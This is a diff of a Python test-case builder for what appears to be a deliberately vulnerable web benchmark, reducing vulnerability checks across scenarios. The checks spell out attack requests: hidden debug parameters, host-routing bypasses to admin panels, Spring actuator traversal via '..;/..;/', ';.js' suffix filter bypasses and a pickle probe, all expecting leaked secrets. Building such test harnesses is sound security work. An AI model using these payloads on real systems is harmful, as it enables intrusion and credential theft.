@@ -397,31 +397,14 @@ def _build_test_cases(base_url: str, priv_url: str | None = None) -> list[VulnTe
         severity="high",
     ))
 
-    # Internal config leak (modern-app)
-    cases.append(VulnTestCase(
-        id="M_INTERNAL_CFG", name="Internal config endpoint leaks secrets",
-        scenario_id="S4", scenario_name="modern_vulns",
-        method="GET", path="/api/internal/config", host="www.target.bench",
-        expected_flags=["jwt_secret"],
-        severity="high",
-    ))
-
-    # Internal db-status (modern-app)
-    cases.append(VulnTestCase(
-        id="M_INTERNAL_DB", name="Internal DB status endpoint accessible",
-        scenario_id="S4", scenario_name="modern_vulns",
-        method="GET", path="/api/internal/db-status", host="www.target.bench",
-        expected_flags=["collections"],
-        severity="medium",
-    ))
 
     # ═══════════════════════════════════════════════════════════════
-    # S3: hidden_param_detection — admin-panel (admin.target.bench)
+    # S3: hidden_param_detection (精简 21→7)
     # ═══════════════════════════════════════════════════════════════
 
-    # debug=1 on login (POST)
+    # HP_DEBUG_PARAM: debug=1 on login (POST)
     cases.append(VulnTestCase(
-        id="HP_DEBUG", name="Hidden param debug=1 on login",
+        id="HP_DEBUG_PARAM", name="Hidden param debug=1 on login",
         scenario_id="S3", scenario_name="hidden_param_detection",
         method="POST", path="/login?debug=1", host="admin.target.bench",
         headers={"Content-Type": "application/x-www-form-urlencoded"},
@@ -430,144 +413,23 @@ def _build_test_cases(base_url: str, priv_url: str | None = None) -> list[VulnTe
         severity="high",
     ))
 
-    # trace=1 on login (GET)
+    # HP_INTERNAL_PARAM: internal=true on /api/users
     cases.append(VulnTestCase(
-        id="HP_TRACE", name="Hidden param trace=1 on login",
-        scenario_id="S3", scenario_name="hidden_param_detection",
-        method="GET", path="/login?trace=1", host="admin.target.bench",
-        expected_flags=["token", "trace"],
-        severity="high",
-    ))
-
-    # internal=true on /api/users
-    cases.append(VulnTestCase(
-        id="HP_INTERNAL", name="Hidden param internal=true",
+        id="HP_INTERNAL_PARAM", name="Hidden param internal=true",
         scenario_id="S3", scenario_name="hidden_param_detection",
         method="GET", path="/api/users?internal=true", host="admin.target.bench",
         expected_flags=["HIDDEN_PARAM_INTERNAL_TRUE"],
         severity="high",
     ))
 
-    # mock=1 on /api/users
+    # HP_SENSITIVE_PARAM: sandbox=1 on /api/system/status
     cases.append(VulnTestCase(
-        id="HP_MOCK", name="Hidden param mock=1",
-        scenario_id="S3", scenario_name="hidden_param_detection",
-        method="GET", path="/api/users?mock=1", host="admin.target.bench",
-        expected_flags=["HIDDEN_PARAM_MOCK_DATA"],
-        severity="medium",
-    ))
-
-    # env=development on /api/users
-    cases.append(VulnTestCase(
-        id="HP_ENV", name="Hidden param env=development",
-        scenario_id="S3", scenario_name="hidden_param_detection",
-        method="GET", path="/api/users?env=development", host="admin.target.bench",
-        expected_flags=["HIDDEN_PARAM_ENV_DEV"],
-        severity="high",
-    ))
-
-    # format=csv on /api/users (needs __admin_token to bypass auth)
-    cases.append(VulnTestCase(
-        id="HP_CSV", name="Hidden param format=csv",
-        scenario_id="S3", scenario_name="hidden_param_detection",
-        method="GET", path="/api/users?format=csv&__admin_token=sk-app-internal", host="admin.target.bench",
-        expected_flags=["id,username,role"],
-        severity="high",
-    ))
-
-    # nocache=1 on /api/users/1/orders
-    cases.append(VulnTestCase(
-        id="HP_NOCACHE", name="Hidden param nocache=1",
-        scenario_id="S3", scenario_name="hidden_param_detection",
-        method="GET", path="/api/users/1/orders?nocache=1", host="admin.target.bench",
-        expected_flags=["HIDDEN_PARAM_NOCACHE_FULL"],
-        severity="medium",
-    ))
-
-    # callback=func on /api/users/1/orders (JSONP)
-    cases.append(VulnTestCase(
-        id="HP_CALLBACK", name="Hidden param callback=func (JSONP)",
-        scenario_id="S3", scenario_name="hidden_param_detection",
-        method="GET", path="/api/users/1/orders?callback=test", host="admin.target.bench",
-        expected_flags=["test(", "orders"],
-        severity="medium",
-    ))
-
-    # force=1 on /api/users/2 (use user 2 to avoid DELETE conflict)
-    cases.append(VulnTestCase(
-        id="HP_FORCE", name="Hidden param force=1",
-        scenario_id="S3", scenario_name="hidden_param_detection",
-        method="GET", path="/api/users/2?force=1", host="admin.target.bench",
-        expected_flags=["username", "password"],  # returns full user object
-        severity="high",
-    ))
-
-    # preview=1 on /api/users/2 (use user 2 to avoid DELETE conflict)
-    cases.append(VulnTestCase(
-        id="HP_PREVIEW", name="Hidden param preview=1",
-        scenario_id="S3", scenario_name="hidden_param_detection",
-        method="GET", path="/api/users/2?preview=1", host="admin.target.bench",
-        expected_flags=["HIDDEN_PARAM_PREVIEW_MODE"],
-        severity="medium",
-    ))
-
-    # _method=DELETE on /api/users/3 (use user 3, runs last among user-specific tests)
-    cases.append(VulnTestCase(
-        id="HP_METHOD", name="Hidden param _method=DELETE",
-        scenario_id="S3", scenario_name="hidden_param_detection",
-        method="GET", path="/api/users/3?_method=DELETE", host="admin.target.bench",
-        expected_flags=["HIDDEN_PARAM_METHOD_OVERRIDE"],
-        severity="high",
-    ))
-
-    # raw=1 on /api/system/status
-    cases.append(VulnTestCase(
-        id="HP_RAW", name="Hidden param raw=1",
-        scenario_id="S3", scenario_name="hidden_param_detection",
-        method="GET", path="/api/system/status?raw=1", host="admin.target.bench",
-        expected_flags=["HIDDEN_PARAM_RAW_CONFIG", "jwt_secret"],
-        severity="high",
-    ))
-
-    # test=1 on /api/system/status
-    cases.append(VulnTestCase(
-        id="HP_TEST", name="Hidden param test=1",
-        scenario_id="S3", scenario_name="hidden_param_detection",
-        method="GET", path="/api/system/status?test=1", host="admin.target.bench",
-        expected_flags=["HIDDEN_PARAM_TEST_MODE"],
-        severity="medium",
-    ))
-
-    # sandbox=1 on /api/system/status
-    cases.append(VulnTestCase(
-        id="HP_SANDBOX", name="Hidden param sandbox=1",
+        id="HP_SENSITIVE_PARAM", name="Hidden param sensitive (sandbox=1)",
         scenario_id="S3", scenario_name="hidden_param_detection",
         method="GET", path="/api/system/status?sandbox=1", host="admin.target.bench",
         expected_flags=["HIDDEN_PARAM_SANDBOX_BYPASS"],
         severity="high",
     ))
-
-    # index.html 的 dev-sec/sk-app 由 V15_500LEAK 的 env 泄漏覆盖
-    # internal=true 参数名由 HTML 注释覆盖
-
-    # 500 error leak — verify debug mode is enabled (confirmed by error response detail)
-    # The Flask DEBUG=True means detailed errors are leaked on any unhandled exception
-    cases.append(VulnTestCase(
-        id="V15_500LEAK", name="DEBUG mode leaks error details",
-        scenario_id="S3", scenario_name="hidden_param_detection",
-        method="POST", path="/api/preferences", host="admin.target.bench",
-        headers={"Content-Type": "application/json"},
-        body=json.dumps({"__pickle_data": "invalid_base64!!!"}),
-        expected_flags=["error"],  # response includes detailed error message (not "Internal server error")
-        severity="high",
-    ))
-
-    # HP_404DEBUG 冗余 — debug=1/trace=1/internal=true 参数名已由
-    # 其他线索渠道覆盖 (HTML注释/JS注释/SourceMap/错误提示)
-
-    # ═══════════════════════════════════════════════════════════════
-    # Additional admin-panel vulns (V10 Pickle, V11 XXE, V12 Header)
-    # ═══════════════════════════════════════════════════════════════
 
     # V10: Pickle deserialization
     pickle_payload = base64.b64encode(pickle.dumps({"test": "data"})).decode()
@@ -602,91 +464,50 @@ def _build_test_cases(base_url: str, priv_url: str | None = None) -> list[VulnTe
         severity="high",
     ))
 
-    # Internal endpoints (admin-panel)
+    # V15_500LEAK: 500 error leak — verify debug mode is enabled
     cases.append(VulnTestCase(
-        id="ADMIN_HEALTH", name="Internal health endpoint",
+        id="V15_500LEAK", name="DEBUG mode leaks error details",
         scenario_id="S3", scenario_name="hidden_param_detection",
-        method="GET", path="/api/internal/health", host="admin.target.bench",
-        expected_flags=["INTERNAL_ENDPOINT_HEALTH"],
-        severity="medium",
-    ))
-
-    cases.append(VulnTestCase(
-        id="ADMIN_DB", name="Internal DB status endpoint",
-        scenario_id="S3", scenario_name="hidden_param_detection",
-        method="GET", path="/api/internal/db-status", host="admin.target.bench",
-        expected_flags=["INTERNAL_ENDPOINT_DB_STATUS"],
+        method="POST", path="/api/preferences", host="admin.target.bench",
+        headers={"Content-Type": "application/json"},
+        body=json.dumps({"__pickle_data": "invalid_base64!!!"}),
+        expected_flags=["error"],
         severity="high",
     ))
 
-    cases.append(VulnTestCase(
-        id="ADMIN_CACHE", name="Internal cache stats endpoint",
-        scenario_id="S3", scenario_name="hidden_param_detection",
-        method="GET", path="/api/internal/cache-stats", host="admin.target.bench",
-        expected_flags=["INTERNAL_ENDPOINT_CACHE_STATS"],
-        severity="medium",
-    ))
-
     # ═══════════════════════════════════════════════════════════════
-    # S2: multi_entry_bypass — same endpoints via different hostnames
+    # S2: multi_entry_bypass (精简 6→3)
     # ═══════════════════════════════════════════════════════════════
 
-    # ME1: api.target.bench → admin-panel internal endpoints
+    # ME_API_BYPASS: api.target.bench bypass
     cases.append(VulnTestCase(
-        id="ME1", name="api.target.bench bypass to internal health",
+        id="ME_API_BYPASS", name="api.target.bench bypass to admin internal endpoints",
         scenario_id="S2", scenario_name="multi_entry_bypass",
         method="GET", path="/api/internal/health", host="api.target.bench",
         expected_flags=["INTERNAL_ENDPOINT_HEALTH"],
         severity="critical",
     ))
 
-    # ME2: api.target.bench → admin-panel root via /admin/
+    # ME_SHOP_BYPASS: shop.target.bench bypass
     cases.append(VulnTestCase(
-        id="ME2", name="api.target.bench /admin/ bypass to admin-panel",
-        scenario_id="S2", scenario_name="multi_entry_bypass",
-        method="GET", path="/admin/", host="api.target.bench",
-        expected_flags=["admin-panel"],  # admin-panel login page title
-        severity="critical",
-    ))
-
-    # ME3: api.target.bench → admin-panel system via /system/
-    cases.append(VulnTestCase(
-        id="ME3", name="api.target.bench /system/ bypass to system status",
-        scenario_id="S2", scenario_name="multi_entry_bypass",
-        method="GET", path="/system/status", host="api.target.bench",
-        expected_flags=["status", "version"],
-        severity="critical",
-    ))
-
-    # ME4: shop.target.bench → /sysadmin/ proxy to admin-panel
-    cases.append(VulnTestCase(
-        id="ME4", name="shop.target.bench /sysadmin/ bypass",
+        id="ME_SHOP_BYPASS", name="shop.target.bench /sysadmin/ bypass to admin-panel",
         scenario_id="S2", scenario_name="multi_entry_bypass",
         method="GET", path="/sysadmin/users", host="shop.target.bench",
         expected_flags=["username", "role"],
         severity="critical",
     ))
 
-    # ME5: shop.target.bench → /debug/admin proxy to admin-panel system status
+    # ME_MULTI_HOST_COVERAGE: multi-host coverage
     cases.append(VulnTestCase(
-        id="ME5", name="shop.target.bench /debug/admin bypass",
+        id="ME_MULTI_HOST_COVERAGE", name="shop.target.bench /debug/admin bypass",
         scenario_id="S2", scenario_name="multi_entry_bypass",
         method="GET", path="/debug/admin", host="shop.target.bench",
         expected_flags=["status", "version"],
         severity="high",
     ))
 
-    # api.target.bench → /api/internal/db-status via admin-panel
-    cases.append(VulnTestCase(
-        id="ME_EXTRA_DB", name="api.target.bench bypass to internal db-status",
-        scenario_id="S2", scenario_name="multi_entry_bypass",
-        method="GET", path="/api/internal/db-status", host="api.target.bench",
-        expected_flags=["INTERNAL_ENDPOINT_DB_STATUS"],
-        severity="critical",
-    ))
-
     # ═══════════════════════════════════════════════════════════════
-    # S6: bff_vulns — BFF gateway (shop.target.bench)
+    # S6: bff_vulns (精简 4→3)
     # ═══════════════════════════════════════════════════════════════
 
     # B1: User profile leaks PII via BFF aggregation
@@ -707,21 +528,12 @@ def _build_test_cases(base_url: str, priv_url: str | None = None) -> list[VulnTe
         severity="critical",
     ))
 
-    # B3: /debug/admin exposes admin-panel debug info
+    # B6_COVERAGE: BFF proxy coverage (合并 B3+BFF_INTERNAL)
     cases.append(VulnTestCase(
-        id="B3", name="BFF debug/admin exposes admin-panel debug",
+        id="B6_COVERAGE", name="BFF debug/admin exposes admin-panel debug",
         scenario_id="S6", scenario_name="bff_vulns",
         method="GET", path="/debug/admin", host="shop.target.bench",
         expected_flags=["status", "version"],
-        severity="high",
-    ))
-
-    # Extra: /api/internal/ proxy through BFF
-    cases.append(VulnTestCase(
-        id="BFF_INTERNAL", name="BFF internal proxy leaks admin data",
-        scenario_id="S6", scenario_name="bff_vulns",
-        method="GET", path="/api/internal/health", host="shop.target.bench",
-        expected_flags=["INTERNAL_ENDPOINT_HEALTH"],
         severity="high",
     ))
 
@@ -860,117 +672,80 @@ def _build_test_cases(base_url: str, priv_url: str | None = None) -> list[VulnTe
     ))
 
     # ═══════════════════════════════════════════════════════════════
-    # S17: microservice_path_normalization_bypass
-    # api.target.bench — 同域名微服务路由 + ..;/..;/ 路径规范化差异绕过
+    # S17: microservice_path_normalization_bypass (精简 14→4)
     # ═══════════════════════════════════════════════════════════════
 
+    # PN_TRAVERSAL_BYPASS: ..;/..;/ traversal to actuator/env (代表点)
     cases.append(VulnTestCase(
-        id="PN_TRAVERSAL_USER_ENV", name="..;/..;/ traversal to user-service actuator/env",
+        id="PN_TRAVERSAL_BYPASS", name="..;/..;/ traversal bypass to actuator/env",
         scenario_id="S17", scenario_name="microservice_path_normalization_bypass",
         method="GET", path="/api/users/..;/..;/actuator/env", host="api.target.bench",
         expected_flags=["user_service_app", "Us3rS3rv1ce", "JWT_SECRET"],
         expected_status=200, severity="critical",
     ))
 
+    # PN_TRAVERSAL_COVERAGE: traversal hits ≥2 services (order-service 代表)
     cases.append(VulnTestCase(
-        id="PN_TRAVERSAL_ORDER_ENV", name="..;/..;/ traversal to order-service actuator/env",
+        id="PN_TRAVERSAL_COVERAGE", name="..;/..;/ traversal to order-service actuator/env",
         scenario_id="S17", scenario_name="microservice_path_normalization_bypass",
         method="GET", path="/api/orders/..;/..;/actuator/env", host="api.target.bench",
         expected_flags=["order_service_app", "0rd3rS3rv1ce", "MQ_URL"],
-        expected_status=200, severity="critical",
-    ))
-
-    cases.append(VulnTestCase(
-        id="PN_TRAVERSAL_PAYMENT_ENV", name="..;/..;/ traversal to payment-service actuator/env",
-        scenario_id="S17", scenario_name="microservice_path_normalization_bypass",
-        method="GET", path="/api/payments/..;/..;/actuator/env", host="api.target.bench",
-        expected_flags=["payment_service_app", "sk_live", "STRIPE_API_KEY"],
-        expected_status=200, severity="critical",
-    ))
-
-    cases.append(VulnTestCase(
-        id="PN_TRAVERSAL_USER_MAPPINGS", name="..;/..;/ traversal to user-service actuator/mappings",
-        scenario_id="S17", scenario_name="microservice_path_normalization_bypass",
-        method="GET", path="/api/users/..;/..;/actuator/mappings", host="api.target.bench",
-        expected_flags=["UserController"],
         expected_status=200, severity="high",
     ))
 
+    # PN_DIRECT_BLOCKED: direct /actuator blocked by gateway
     cases.append(VulnTestCase(
-        id="PN_TRAVERSAL_ORDER_MAPPINGS", name="..;/..;/ traversal to order-service actuator/mappings",
-        scenario_id="S17", scenario_name="microservice_path_normalization_bypass",
-        method="GET", path="/api/orders/..;/..;/actuator/mappings", host="api.target.bench",
-        expected_flags=["OrderController"],
-        expected_status=200, severity="high",
-    ))
-
-    cases.append(VulnTestCase(
-        id="PN_TRAVERSAL_PAYMENT_MAPPINGS", name="..;/..;/ traversal to payment-service actuator/mappings",
-        scenario_id="S17", scenario_name="microservice_path_normalization_bypass",
-        method="GET", path="/api/payments/..;/..;/actuator/mappings", host="api.target.bench",
-        expected_flags=["PaymentController"],
-        expected_status=200, severity="high",
-    ))
-
-    cases.append(VulnTestCase(
-        id="PN_ACTUATOR_DIRECT_BLOCKED", name="Direct actuator/env blocked by gateway",
+        id="PN_DIRECT_BLOCKED", name="Direct /actuator/env blocked by gateway",
         scenario_id="S17", scenario_name="microservice_path_normalization_bypass",
         method="GET", path="/actuator/env", host="api.target.bench",
         expected_status=403, severity="medium",
     ))
 
+    # PN_URL_ENCODED_BLOCKED: URL-encoded traversal also blocked
     cases.append(VulnTestCase(
-        id="PN_ACTUATOR_HEALTH_DIRECT_BLOCKED", name="Direct actuator/health blocked by gateway",
-        scenario_id="S17", scenario_name="microservice_path_normalization_bypass",
-        method="GET", path="/actuator/health", host="api.target.bench",
-        expected_status=403, severity="medium",
-    ))
-
-    cases.append(VulnTestCase(
-        id="PN_TRAVERSAL_USER_HEALTH", name="..;/..;/ traversal to user-service actuator/health",
-        scenario_id="S17", scenario_name="microservice_path_normalization_bypass",
-        method="GET", path="/api/users/..;/..;/actuator/health", host="api.target.bench",
-        expected_flags=["UP"],
-        expected_status=200, severity="medium",
-    ))
-
-    cases.append(VulnTestCase(
-        id="PN_URL_ENCODED_TRAVERSAL", name="URL-encoded ..%2f..%2f blocked by nginx actuator block",
+        id="PN_URL_ENCODED_BLOCKED", name="URL-encoded ..%2f..%2f blocked by nginx",
         scenario_id="S17", scenario_name="microservice_path_normalization_bypass",
         method="GET", path="/api/users/..%2f..%2f/actuator/env", host="api.target.bench",
         expected_status=403, severity="medium",
     ))
 
+    # ═══════════════════════════════════════════════════════════════
+    # S18: admin_whitelist_suffix_bypass (精简 12→4)
+    # ═══════════════════════════════════════════════════════════════
+
+    # WB_SUFFIX_BYPASS: ;.js bypass (代表点 — user-service)
     cases.append(VulnTestCase(
-        id="PN_TRAVERSAL_USER_CONFIGPROPS", name="..;/..;/ traversal to user-service actuator/configprops",
-        scenario_id="S17", scenario_name="microservice_path_normalization_bypass",
-        method="GET", path="/api/users/..;/..;/actuator/configprops", host="api.target.bench",
-        expected_flags=["management.endpoints"],
+        id="WB_SUFFIX_BYPASS", name=";.js bypass to user-service admin/dashboard",
+        scenario_id="S18", scenario_name="admin_whitelist_suffix_bypass",
+        method="GET", path="/api/users/admin/dashboard;.js", host="api.target.bench",
+        expected_flags=["ADMIN_WHITELIST_BYPASS_USER", "allUsers", "jwtSecret"],
+        expected_status=200, severity="critical",
+    ))
+
+    # WB_SUFFIX_COVERAGE: ;.js bypass on order-service (覆盖面代表)
+    cases.append(VulnTestCase(
+        id="WB_SUFFIX_COVERAGE", name=";.js bypass to order-service admin/dashboard",
+        scenario_id="S18", scenario_name="admin_whitelist_suffix_bypass",
+        method="GET", path="/api/orders/admin/dashboard;.js", host="api.target.bench",
+        expected_flags=["ADMIN_WHITELIST_BYPASS_ORDER", "mqPassword"],
         expected_status=200, severity="high",
     ))
 
+    # WB_SUFFIX_VARIANT: ;.html variant bypass
     cases.append(VulnTestCase(
-        id="PN_TRAVERSAL_USER_BEANS", name="..;/..;/ traversal to user-service actuator/beans",
-        scenario_id="S17", scenario_name="microservice_path_normalization_bypass",
-        method="GET", path="/api/users/..;/..;/actuator/beans", host="api.target.bench",
-        expected_flags=["UserController"],
-        expected_status=200, severity="medium",
-    ))
-
-    cases.append(VulnTestCase(
-        id="PN_NORMAL_API_USERS", name="S17 service alive via traversal to actuator/env",
-        scenario_id="S17", scenario_name="microservice_path_normalization_bypass",
-        method="GET", path="/api/users/..;/..;/actuator/env", host="api.target.bench",
-        expected_flags=["user_service_app"],
-        expected_status=200, severity="low",
-    ))
-
-    cases.append(VulnTestCase(
-        id="PN_USER_ACTUATOR_DISCOVERY", name="..;/..;/ traversal to user-service actuator discovery",
-        scenario_id="S17", scenario_name="microservice_path_normalization_bypass",
-        method="GET", path="/api/users/..;/..;/actuator", host="api.target.bench",
-        expected_flags=["_links"],
+        id="WB_SUFFIX_VARIANT", name=";.html bypass to user-service admin/dashboard",
+        scenario_id="S18", scenario_name="admin_whitelist_suffix_bypass",
+        method="GET", path="/api/users/admin/dashboard;.html", host="api.target.bench",
+        expected_flags=["ADMIN_WHITELIST_BYPASS_USER"],
         expected_status=200, severity="high",
+    ))
+
+    # WB_DIRECT_BLOCKED: direct access blocked
+    cases.append(VulnTestCase(
+        id="WB_DIRECT_BLOCKED", name="Direct /api/users/admin/dashboard blocked by filter",
+        scenario_id="S18", scenario_name="admin_whitelist_suffix_bypass",
+        method="GET", path="/api/users/admin/dashboard", host="api.target.bench",
+        expected_status=403, severity="medium",
     ))
 
     # v5.0: Auto-route priv-gateway subdomains (admin/api/internal) to priv_url
